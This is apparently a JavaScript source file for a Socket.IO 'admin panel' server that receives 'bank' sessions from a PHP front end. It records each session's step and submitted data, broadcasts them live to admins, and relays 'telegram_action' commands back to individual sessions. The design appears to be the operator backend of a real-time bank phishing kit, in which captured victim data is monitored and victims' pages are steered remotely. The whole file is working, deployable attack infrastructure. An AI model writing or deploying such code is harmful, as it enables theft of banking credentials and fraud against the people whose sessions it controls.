/**
 * Admin Panel Server - Socket.IO Real-time Control
 * Optimized for Railway deployment with 0 delay
 */

const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const path = require('path');
require('dotenv').config();

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: ["http://localhost:3000", "https://*.railway.app", process.env.FRONTEND_URL || "*"],
    methods: ["GET", "POST"],
    credentials: true
  },
  transports: ['websocket', 'polling']
});

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '../public')));

// Session storage (in production, use Redis)
const activeSessions = new Map();
const adminSockets = new Set();

class AdminPanelServer {
  constructor() {
    this.setupSocketHandlers();
    this.setupRoutes();
    this.setupCleanupTasks();
  }

  setupSocketHandlers() {
    io.on('connection', (socket) => {
      console.log(`[ADMIN SERVER] Nueva conexión: ${socket.id}`);

      // Admin panel connection
      socket.on('admin_connect', () => {
        adminSockets.add(socket);
        console.log(`[ADMIN SERVER] Admin conectado: ${socket.id}`);
        this.sendActiveSessions(socket);
      });

      // Get active sessions
      socket.on('admin_get_sessions', () => {
        this.sendActiveSessions(socket);
      });

      // Execute admin action
      socket.on('admin_action', (data) => {
        this.executeAdminAction(data, socket);
      });

      // Bank session events
      socket.on('session_start', (data) => {
        this.registerSession(data);
      });

      socket.on('session_update', (data) => {
        this.updateSession(data);
      });

      socket.on('session_data', (data) => {
        this.updateSessionData(data);
      });

      socket.on('session_end', (sessionId) => {
        this.endSession(sessionId);
      });

      // Handle disconnection
      socket.on('disconnect', () => {
        console.log(`[ADMIN SERVER] Desconexión: ${socket.id}`);
        adminSockets.delete(socket);
      });
    });
  }

  setupRoutes() {
    // Health check for Railway
    app.get('/health', (req, res) => {
      res.json({ 
        status: 'healthy', 
        timestamp: Date.now(),
        activeSessions: activeSessions.size,
        connectedAdmins: adminSockets.size
      });
    });

    // API to receive session updates from PHP
    app.post('/api/session/start', (req, res) => {
      const sessionData = req.body;
      this.registerSession(sessionData);
      res.json({ success: true });
    });

    app.post('/api/session/update', (req, res) => {
      const sessionData = req.body;
      this.updateSession(sessionData);
      res.json({ success: true });
    });

    app.post('/api/session/data', (req, res) => {
      const sessionData = req.body;
      this.updateSessionData(sessionData);
      res.json({ success: true });
    });

    app.post('/api/session/end', (req, res) => {
      const { sessionId } = req.body;
      this.endSession(sessionId);
      res.json({ success: true });
    });

    // Execute action endpoint for PHP integration
    app.post('/api/admin/action', (req, res) => {
      const { sessionId, action } = req.body;
      this.broadcastActionToSession(sessionId, action);
      res.json({ success: true, message: `Acción ${action} enviada a sesión ${sessionId}` });
    });

    // Get active sessions API
    app.get('/api/sessions', (req, res) => {
      const sessions = Array.from(activeSessions.values());
      res.json({ sessions });
    });

    // Serve admin panel
    app.get('/admin', (req, res) => {
      res.sendFile(path.join(__dirname, '../public/admin/index.html'));
    });
  }

  registerSession(sessionData) {
    const session = {
      sessionId: sessionData.sessionId,
      bank: sessionData.bank || 'Unknown',
      step: sessionData.step || 'inicio',
      data: sessionData.data || {},
      timestamp: Date.now(),
      lastUpdate: Date.now(),
      active: true,
      socketId: sessionData.socketId || null
    };

    activeSessions.set(sessionData.sessionId, session);
    console.log(`[ADMIN SERVER] Nueva sesión registrada: ${sessionData.sessionId} (${session.bank})`);

    // Notify all admin panels
    this.broadcastToAdmins('new_session', session);
  }

  updateSession(sessionData) {
    const existingSession = activeSessions.get(sessionData.sessionId);
    if (!existingSession) {
      console.log(`[ADMIN SERVER] Sesión no encontrada: ${sessionData.sessionId}, registrando nueva`);
      this.registerSession(sessionData);
      return;
    }

    const updatedSession = {
      ...existingSession,
      step: sessionData.step || existingSession.step,
      data: { ...existingSession.data, ...(sessionData.data || {}) },
      lastUpdate: Date.now(),
      active: sessionData.active !== undefined ? sessionData.active : existingSession.active
    };

    activeSessions.set(sessionData.sessionId, updatedSession);
    console.log(`[ADMIN SERVER] Sesión actualizada: ${sessionData.sessionId} -> ${updatedSession.step}`);

    // Notify all admin panels
    this.broadcastToAdmins('session_update', updatedSession);
  }

  updateSessionData(sessionData) {
    const session = activeSessions.get(sessionData.sessionId);
    if (!session) {
      console.log(`[ADMIN SERVER] Sesión no encontrada para actualizar datos: ${sessionData.sessionId}`);
      return;
    }

    session.data = { ...session.data, ...(sessionData.data || {}) };
    session.lastUpdate = Date.now();

    activeSessions.set(sessionData.sessionId, session);
    console.log(`[ADMIN SERVER] Datos de sesión actualizados: ${sessionData.sessionId}`);

    // Notify all admin panels
    this.broadcastToAdmins('session_update', session);
  }

  endSession(sessionId) {
    const session = activeSessions.get(sessionId);
    if (session) {
      activeSessions.delete(sessionId);
      console.log(`[ADMIN SERVER] Sesión finalizada: ${sessionId}`);
      
      // Notify all admin panels
      this.broadcastToAdmins('session_closed', sessionId);
    }
  }

  executeAdminAction(actionData, adminSocket) {
    const { sessionId, action } = actionData;
    console.log(`[ADMIN SERVER] Admin acción: ${action} para sesión: ${sessionId}`);

    // Broadcast action to the specific session
    const success = this.broadcastActionToSession(sessionId, action);
    
    // Respond to admin
    adminSocket.emit('action_result', {
      success,
      message: success ? 
        `Acción ${action} enviada exitosamente` : 
        `No se pudo enviar la acción ${action}`
    });
  }

  broadcastActionToSession(sessionId, action) {
    const session = activeSessions.get(sessionId);
    if (!session) {
      console.log(`[ADMIN SERVER] Sesión no encontrada para acción: ${sessionId}`);
      return false;
    }

    // Send to specific session socket if connected
    if (session.socketId) {
      const targetSocket = io.sockets.sockets.get(session.socketId);
      if (targetSocket) {
        targetSocket.emit('telegram_action', { action, timestamp: Date.now() });
        console.log(`[ADMIN SERVER] Acción enviada directamente a socket: ${session.socketId}`);
        return true;
      }
    }

    // Broadcast to all sockets with session ID
    io.emit(`session_${sessionId}`, { action, timestamp: Date.now() });
    console.log(`[ADMIN SERVER] Acción broadcasted para sesión: ${sessionId}`);
    return true;
  }

  sendActiveSessions(socket) {
    const sessions = Array.from(activeSessions.values());
    socket.emit('active_sessions', sessions);
    console.log(`[ADMIN SERVER] Enviadas ${sessions.length} sesiones activas`);
  }

  broadcastToAdmins(event, data) {
    adminSockets.forEach(socket => {
      socket.emit(event, data);
    });
  }

  setupCleanupTasks() {
    // Clean up inactive sessions every 5 minutes
    setInterval(() => {
      const now = Date.now();
      const fiveMinutes = 5 * 60 * 1000;
      
      for (const [sessionId, session] of activeSessions) {
        if (now - session.lastUpdate > fiveMinutes) {
          console.log(`[ADMIN SERVER] Limpiando sesión inactiva: ${sessionId}`);
          this.endSession(sessionId);
        }
      }
    }, 60000); // Check every minute

    // Log stats every 10 minutes
    setInterval(() => {
      console.log(`[ADMIN SERVER] Stats - Sesiones activas: ${activeSessions.size}, Admins conectados: ${adminSockets.size}`);
    }, 600000);
  }
}

// Initialize server
const adminServer = new AdminPanelServer();

// Start server
const PORT = process.env.PORT || 3001;
server.listen(PORT, () => {
  console.log(`[ADMIN SERVER] 🚀 Servidor iniciado en puerto ${PORT}`);
  console.log(`[ADMIN SERVER] 🌐 Panel admin disponible en: http://localhost:${PORT}/admin`);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('[ADMIN SERVER] Cerrando servidor...');
  server.close(() => {
    process.exit(0);
  });
});

module.exports = { app, io, activeSessions };